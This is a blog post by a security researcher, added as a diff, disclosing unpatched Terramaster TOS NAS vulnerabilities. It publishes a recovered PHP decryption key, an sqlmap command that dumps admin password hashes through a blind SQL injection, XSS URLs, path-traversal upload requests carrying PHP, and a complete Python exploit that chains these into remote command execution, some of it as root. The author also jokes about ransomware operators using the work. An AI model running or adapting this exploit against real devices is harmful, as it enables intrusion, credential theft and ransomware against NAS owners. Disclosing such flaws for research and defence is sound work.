@@ -1,0 +1,388 @@
+---
+title: "All you can PWN buffet"
+date: 2022-03-13T05:57:57+01:00
+draft: false
+toc: false
+images:
+tags:
+  - 0x05
+  - 0day
+  - terramaster
+  - rce
+  - sqli
+---
+
+# All you can PWN buffet
+
+Hi folks!
+I recently read about a [few vulnerabilities](https://thehackernews.com/2022/03/critical-bugs-in-terramaster-tos-could.html) on Terramaster which were ~basically stolen from me~ heavily inspired by my previous ones, so I decided to look into Terramaster again, just to find a few more.
+
+This time I didn't spend much time reasearching, and I couldn't find an auth bypass so you will need valid credentials to reach the RCEs. Don't worry tho, you ransomware operators can still get the admin hashes and username. Some hashcat required.
+
+Speaking of ransomware,about the impact the last exploit I published got on the devices, I am sorry for everyone who got their stuff locked by deadbolt. I tried to get in touch with Terramaster, they never replied to me.
+
+Yet, I persisted and this time I made another attempt at getting in touch with the developers - once more I got ghosted.
+
+## The menu
+On today's menu we have:
+
+- 4 new flavours of RCEs
+- 8 flavours of XSS
+- 1 double blind SQLi
+- 1 info disclosure
+
+but before moving to the juicy parts, let's start from the beginning, again.
+
+## Decrypt
+This time the developers put a litte more effort (very little) into encrypting their PHP files. 
+Also, cracking it, made me feel like a terrible person:the key literally asked me to stop poking around their product. **I do have a heart, I swear...**
+
+After me and [@bloodyshell](https://matrix.to/#/@bloodyshell:matrix.org) found out about the update, before I could even download the file, [@bloodyshell](https://matrix.to/#/@bloodyshell:matrix.org) already reversed the key generation algorithm.
+
+```
+It's not easy to develop software,please don't crack it please keep it secret
+```
+
+And they are absolutely right, it is not easy to develop software, but that is not an excuse to not perform security audits or accurate code review. I hope I will eventually reach out to the developers to explain this better.
+
+Anyway, this time the key itself was begging me not to crack their code again. I obviously couldn't resist (**...or maybe I don't, after all.**):
+```c
+void FUN_001016b0(long param_1)
+{
+  ulong uVar1;
+  char cVar2;
+  
+  uVar1 = 0;
+  do {
+    if ((uVar1 & 1) == 0) {
+      cVar2 = s_It's0not2easy3to4develop6softwar_001143b0[uVar1];
+    }
+    else {
+      cVar2 = s_It's0not2easy3to4develop6softwar_001143b0[uVar1 * 2];
+    }
+    *(char *)(param_1 + uVar1) = cVar2;
+    uVar1 = uVar1 + 1;
+  } while (uVar1 != 0x20);
+  return;
+}
+```
+
+To rebuild the key, just do the same as above with some python:
+```python3
+>>> s="""It's0not2easy3to4develop6software,5please7don't9crack8it6please9keep7it3secretIt's0not2easy3to4develop6software,5please7don't9crack8it6please9keep7it3secret"It's0not2easy3to4develop6software,5please7don't9crack8it6please9keep7it3secretIt's0not2easy3to4develop6software,5please7don't9crack8it6please9keep7it3sec
+ret"""
+>>> len(s)
+313
+>>> ''.join([s[i] if (i % 2) == 0 else s[i*2] for i in range(32)])
+"I''o0aot2eaoyota45eaedot6aoitlae"
+```
+
+Conclusion? Even after I **highly suggested** not to focus on protecting the PHP code from view, but on securing its bugs first, no real patch was addressed for the RCEs which still appear to be there.
+
+Anyway, the new key is: `I''o0aot2eaoyota45eaedot6aoitlae`. You can reuse the [unscerw script](https://gist.github.com/thatsn0tmysite/c20602289d2cdc9ab7484851eefd92ba) from last time. Just change the key.
+
+Security through obscurity is never a good idea. Sorry guys.
+
+Also I noticed that the whole UI is taken from this GPLv3 licensed application: [github.com/kalcaddle/KodExplorer](https://github.com/kalcaddle/KodExplorer) and somebody forgot to include it in their open source licensed softwares (or I couldn't find it from a quick glance in their provided source files):
+```
+https://www.terra-master.com/it/gplsource/
+```
+
+## Vulns, vulns everywhere.
+### Still too much info, pal.
+Since the old APIs are now "protected" from unauthorized users, I had to find a new info disclosure.
+To achieve this we simply send any malformed request to:
+```
+http://nas.ip:8181/v1/SessionEvents/update
+```
+
+This time we only get back a couple information about php, the webserver and... the username of the `admin` user. 
+
+- ~Get admin user~ DONE.
+
+Also, it is worthy to notice that the update procedure does not seem to delete old files, after upgrading I still had the `m1.php` and `m2.php` files. 
+This still leaves the app vulnerable to the MAC address disclosure discussed in the [previous blogpost](https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/).
+
+### SQLi
+Since this time we didn't get the admin hash back, I looked for other ways to get it.
+Turns out one can just get the password hash from the database using a double blind SQLi in the login form. **Unauthenticated**. So old school.
+
+The vulnerable parameter is the `name` field in the query string inside the `user.class.php::loginSubmit` function. 
+
+I optimized the sqlmap command as much as I could, modify as needed:
+```bash
+sqlmap -u "http://nas.ip/tos/index.php?user/loginSubmit&name=sqli&password=n0t&platform=me" --dbms=sqlite --level=5 --risk=2 --technique=t -p name -T user_table -C password --dump --time-sec {args.sqlmap_time} --where "username=$(printf $ADMIN | base64)"
+```
+
+Obviously replace $ADMIN with the username of the administrator from the previous step.
+
+This takes a little time, but not too long, so go grab a coffee and wait ~for the new ransomware wave~. This joke is not as funny now that it actually happened - is it? You can't say I did not warn you though.
+
+- ~Get the admin hash~ DONE.
+
+### RCEs
+As usual, it has not been very difficult to pwn TOS, using the [previously mentioned technique](https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/) of grepping for `shell`.
+
+As for the RCEs, same ol'story, user input **still** doesn't get validated in many places, or gets validated poorly (seriously, get a [hint](https://www.php.net/manual/en/function.escapeshellcmd.php) or [two](https://www.php.net/manual/en/function.escapeshellarg.php)).
+
+They are all pretty obvious in the exploit.
+
+### XSS galore
+Basically all parameters used in these pages are vulnerable, in case you needed a reminder that `echo $_GET['whatever'];` is always a bad idea:
+ 
+```
+http://nas.ip:8181/3.0/template/share/edit.php?user=%22%20onerror=alert(1)%3Ealert(1);//%3C/script%3E
+
+http://nas.ip:8181/3.0/template/share/editor.php?user=%22%20onerror=alert(1)%3Ealert(1);//%3C/script%3E
+
+http://nas.ip:8181/3.0/template/share/explorer.php?user=%22%20onerror=alert(1)%3Ealert(1);//%3C/script%3E
+
+http://nas.ip:8181/3.0/template/share/file.php?user=%22%20onerror=alert(1)%3Ealert(1);//%3C/script%3E
+
+http://nas.ip:8181/3.0/template/share/tips.php?user=%22%20onerror=alert(1)%3Ealert(1);//%3C/script%3E
+
+http://nas.ip:8181/3.0/template/user/login-preview.php?q9=<script>alert(1)</script>
+
+http://nas.ip:8181/module/index.php?mod=Portainer&t=aaaaaaaaaa%22;alert(1);var%20x=%22
+
+http://nas.ip:8181/tos/index.php?share/folder&sid=a&user=a%22%3E%3C/script%3E%3Cimg%20src=x%20onerror=alert(1)%3E&path=/
+```
+
+### Misc
+After the main dish, if you are interested there are a few more gotchas:
+
+- All downloads from the store happen over HTTP, not HTTPS. A random example is: `http://dl.terra-master.com/cn/RTK7.0CJ/Tomcat_TOS_APP_1.2.1_aarch64.tpk`
+- I could count at least one more hardcoded key in the application, which is found in the Mcrypt class: `a!takA:dlmcldEv,e`. Used when Mcrypt gets called without a key parameter.
+- I found a couple path traversal, but I was too lazy to see if they could be properly weaponized, notes are below, enjoy:
+```
+POST http://nas.ip:8181/include/ajax/ajaxdata.php HTTP/1.1
+Host: nas.ip:8181
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: multipart/form-data; boundary=---------------------------272557087831800767091975222786
+Content-Length: 515
+Origin: http://nas.ip:8181
+Connection: keep-alive
+Referer: http://nas.ip:8181/tos/index.php?setting
+Cookie: PHPSESSID=d4ccdee5a084ad3a4534ba5982ca9db1; tos_visit_time=1646086250; kod_name=admin; noshow=1
+Upgrade-Insecure-Requests: 1
+
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name="uploaddir"
+
+../../../../../../../../tmp
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name="sysbakfunction"
+
+13
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name="filename"; filename="allyourbase.jpg"
+Content-Type: image/jpeg
+
+<?php phpinfo(); ?>
+-----------------------------272557087831800767091975222786--
+```
+
+```
+POST http://nas.ip:8181/include/ajax/ajaxdata.php HTTP/1.1
+Host: nas.ip:8181
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: multipart/form-data; boundary=---------------------------272557087831800767091975222786
+Content-Length: 515
+Origin: http://nas.ip:8181
+Connection: keep-alive
+Referer: http://nas.ip:8181/tos/index.php?setting
+Cookie: PHPSESSID=d4ccdee5a084ad3a4534ba5982ca9db1; tos_visit_time=1646086250; kod_name=admin; noshow=1
+Upgrade-Insecure-Requests: 1
+
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name="uploaddir"
+
+../../../../../../usr/www
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name="sysbakfunction"
+
+2
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name="filename"; filename="allyourbase.jpg"
+Content-Type: image/jpeg
+
+<?php phpinfo(); ?>
+-----------------------------272557087831800767091975222786--
+```
+
+## Destroy
+Once again, we can chain some of the vulns to get to an RCE, sadly this time it requires a tiny bit of effort:
+
+```python3
+#!/bin/env python3
+
+#Title: Terramaster TOS Time based SQLi & Multiple RCEs
+#Author: n0tme (thatsn0tmysite)
+#TOS version: 4.2.28-2201201720, 4.2.30-2203011629
+
+from pydoc import describe
+import requests
+import shutil, os, time
+from argparse import ArgumentParser
+import urllib3
+import base64, hashlib, re
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+USER=""
+PASS=""
+B64USER=""
+TARGET=""
+MAC_ADDRESS=""
+RE=re.compile(r'(?:[0-9a-fA-F]:?){12}')
+
+def tos_encrypt_str(toencrypt):
+    key = MAC_ADDRESS[6:] 
+    return hashlib.md5(f"{key}{toencrypt}".encode("utf8")).hexdigest()
+
+def get_session(use_proxy):
+    s=requests.Session()
+    if use_proxy is not None:
+        s.proxies = {"http":use_proxy, "https": use_proxy}
+    return s
+
+def user_session(s, username, password_hash):
+    s.cookies.clear()
+    cookies = {"kod_name":username, "kod_token":tos_encrypt_str(password_hash), "tos_token":None}
+    timestamp=str(int(time.time()))
+    s.headers.update({"signature": tos_encrypt_str(timestamp), "timestamp": timestamp})
+    s.headers.update({"User-device": "TNAS"})
+    s.headers.update({"User-agent": "TNAS"})
+    for name,value in cookies.items():
+        s.cookies[name] = value
+
+def exploit(s, username, password_hash, rce, command):
+    user_session(s, USER, password_hash)
+    s.headers.update({"authorization": hashlib.sha256(password_hash.encode("ascii")).hexdigest()})
+    
+    if rce == 2:
+        s.headers.update({"authorization": password_hash})
+    print("[*] Session info:")
+    for k,v in s.headers.items():
+        print("\t"+k+": "+v)
+    print("\t"+"Cookie: ", end="")
+    for k,v in s.cookies.items():
+        print(k+": "+v+"; ",end="")
+    print()
+ 
+    print("[*] Logging in... ",end="")
+    r=s.get(f"{TARGET}/module/api.php?mobile/login&username={USER}&password={PASS}")
+    result=r.json()["msg"]
+    print(result)
+    if result != "login successful":
+        print("[!] Login failed.")
+        exit(1)
+
+    #RCEs
+    RCEs = [
+        #HASH is not really required for the first 2, but i was too lazy...
+        f"{TARGET}/tos/index.php?explorer/serverDownload&type=download&save_path=%5C&url=';{command};'&_",  #NEEDS USER  CREDS -> runs as user
+        f"{TARGET}/include/ajax/ajaxdata.php?mysqlfunction=1&password=%7C%7C%20{command}",                  #NEEDS ADMIN CREDS -> runs as root
+
+        #REQUIRE MAC ADDRESS AND CREDENTIALS
+        f"{TARGET}/module/api.php?wap/serverstatus&servername=';{command};'",                               #NEEDS USER CREDS, ADMIN HASH -> runs as root
+        f"{TARGET}/module/api.php?mobile/stopTranscode&md5name=';{command};'"                               #NEEDS USER CREDS, USER HASH -> runs as root
+    ]
+    print(f"[~] Using: {RCEs[rce]}")
+
+    r=s.get(RCEs[rce])
+    print(r.text)
+
+if __name__ == "__main__":
+    #CHANGE EXPLOIT TO EITHER GET THE HASH OR LOGIN AND EXECUTE COMMANDS VIA RCEs, also eleveate privileges via other vectors for sqli
+    meow="  ^ ^\n (-.-) ...copycats...\n~( ||)"
+
+    parser = ArgumentParser()
+    parser.add_argument("target", help="Target to exploit")
+    parser.add_argument("-c", "--cmd", action="store", default="id", help="Command to run")
+    parser.add_argument("-u", "--username", action="store", default=None, help="Username to log in with")
+    parser.add_argument("-p", "--password", action="store", default=None, help="Password to log in with")
+    parser.add_argument("-g","--get-hash", action="store_true", default=None, help="Retrieve hash and quit (if no --username specified, attempts to grab USER's hash)")
+    parser.add_argument("-H", "--hash", action="store", default=None, help="Retrieved hash")
+
+    parser.add_argument("--rce", action="store", type=int, default=1, help="RCE to use (--list for info)")
+    parser.add_argument("--list", action="store_true", default=False, help="List available RCEs and info")
+    parser.add_argument("--proxy", action="store", default=None, help="Proxy address to use (e.g. http://localhost:8080)")
+
+    parser.add_argument("--sqlmap-path", action="store", default=shutil.which("sqlmap"), help="Path to sqlmap")
+    parser.add_argument("--sqlmap-time", action="store", type=int, default=1, help="Passed as --time-sec to sqlmap")
+    args=parser.parse_args()
+
+    if args.list:
+        print("[-] RCEs:")
+        print("\t0: Needs user credentials only (* +user hash). Runs as user.")
+        print("\t1: Needs admin credentials only (* +admin hash). Runs as root.")
+        print("\t2: Needs user credentials AND admin hash. Runs as root.")
+        print("\t3: Needs user credentials AND user hash. Runs as root. WILL BREAK THINGS.")
+        print("\n* Even if 0 and 1 do not really require a hash, provide a valid one it as otherwise the login fails, lazy me.")
+        exit(0)
+    if args.sqlmap_path is None and (args.users_table is None or args.credentials is None):
+        print("[!] Could not find sqlmap on the system, to install it: 'pip install sqlmap'")
+        exit(1)
+    
+    s = get_session(args.proxy)
+    TARGET = args.target
+
+    if args.username is None:
+        #ADMIN USER INFO DISCLOSURE
+        USER = s.get(f"{TARGET}/v1/SessionEvents/update").json()["data"]["USER"] 
+        B64USER = str(base64.b64encode(USER.encode("utf8")), encoding="utf8")
+        print(f"[*] Found ADMIN user: {USER} ({B64USER})")
+    else:
+       USER = args.username
+       B64USER = str(base64.b64encode(USER.encode("utf8")), encoding="utf8") 
+       print(f"[*] Using provided USER: {USER} ({B64USER})")
+
+    if args.get_hash:
+        #Too lazy to manually implement this, so I'll just use sqlmap
+        #SQL Injection (Double Blind)
+        cmd=f"{args.sqlmap_path} -u \"{args.target}/tos/index.php?user/loginSubmit&name=sqli&password=n0t&platform=me\" --batch --dbms=sqlite --level=5 --risk=2 --technique=t -p name -T user_table -C password  --dump --time-sec {args.sqlmap_time} --where \"username='{B64USER}'\""
+        print(f"[.] Launching sqlmap (may take a while): {cmd}")
+        os.system(cmd)        
+        print("[.] If dump was successfull re-run exploit with -H or --hash")
+        print("[.] Check for hash in STDOUT or ~/.local/share/sqlmap/output/<TARGET>/dump/SQLite_masterdb/user_table.csv")
+        print("[.] Here, hava a cat judging you:")
+        print(meow)
+        exit(0)
+
+    #MAC INFO DISCLOSURE
+    try:
+        MAC_ADDRESS = RE.findall(s.get(f"{TARGET}/m1.php").text)[0].replace(":","")
+    except IndexError:
+        try:
+            MAC_ADDRESS = RE.findall(s.get(f"{TARGET}/m2.php").text)[0].replace(":","")
+        except IndexError:
+            print("[!] MAC not found.")
+            exit(1)
+    print(f"[*] Found MAC: {MAC_ADDRESS}")
+    
+
+    PASS = args.password
+    HASH = args.hash
+    if PASS == "":
+        print("[!] User password is required to launch exploit, use --password.")
+        exit(1)
+    if HASH == "":
+        print("[!] User hash is required to launch exploit, use -g or --get-hash to get a valid hash.")
+        exit(1)  
+    
+    print(f"[*] Using password: {PASS}")
+    print(f"[*] Using hash: {args.hash}")
+    exploit(s, USER, args.hash, args.rce, args.cmd)
+```
+
+## Goodbye, my friend
+I guess I will now take a break from breaking Terramaster, it stopped being fun - at least for now, its basically a metasploitable in a box.
+
+As for the remediations, this time you really can't do much other than wait for a patch and use strong passwords.
+
+As a side note, if any researcher uses my work it'd be cool if y'all mentioned me. Just saying.
+
